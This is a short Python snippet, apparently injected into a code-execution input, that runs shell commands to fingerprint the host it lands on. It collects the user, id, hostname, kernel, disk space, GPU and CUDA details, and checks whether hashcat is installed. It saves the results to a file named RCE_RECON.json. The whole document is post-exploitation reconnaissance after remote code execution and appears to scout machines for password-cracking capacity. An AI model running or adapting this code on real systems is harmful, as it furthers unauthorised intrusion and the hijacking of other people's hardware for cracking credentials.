inputs.code:
import subprocess, json, os, sys
result = {}
result["whoami"] = subprocess.check_output("whoami", shell=True, timeout=5).decode().strip()
result["id"] = subprocess.check_output("id 2>&1 || echo N/A", shell=True, timeout=5).decode().strip()
result["hostname"] = subprocess.check_output("hostname", shell=True, timeout=5).decode().strip()
result["uname"] = subprocess.check_output("uname -a 2>&1 || ver", shell=True, timeout=5).decode().strip()
result["gpu"] = subprocess.check_output("nvidia-smi -L 2>&1 || echo NO_NVIDIA", shell=True, timeout=10).decode().strip()
result["hashcat"] = subprocess.check_output("which hashcat 2>&1 || where hashcat 2>&1 || echo NOT_FOUND", shell=True, timeout=5).decode().strip()
result["cuda"] = subprocess.check_output("nvcc --version 2>&1 | tail -1 || echo NO_NVCC", shell=True, timeout=5).decode().strip()
result["disk"] = subprocess.check_output("df -h / /tmp 2>&1 || wmic logicaldisk get caption,freespace 2>&1", shell=True, timeout=5).decode().strip()
result["cwd"] = os.getcwd()
result["python"] = sys.executable
outdir = os.path.join(os.getcwd(), "output")
os.makedirs(outdir, exist_ok=True)
with open(os.path.join(outdir, "RCE_RECON.json"), "w") as f:
    json.dump(result, f, indent=2)
return json.dumps(result)[:200]
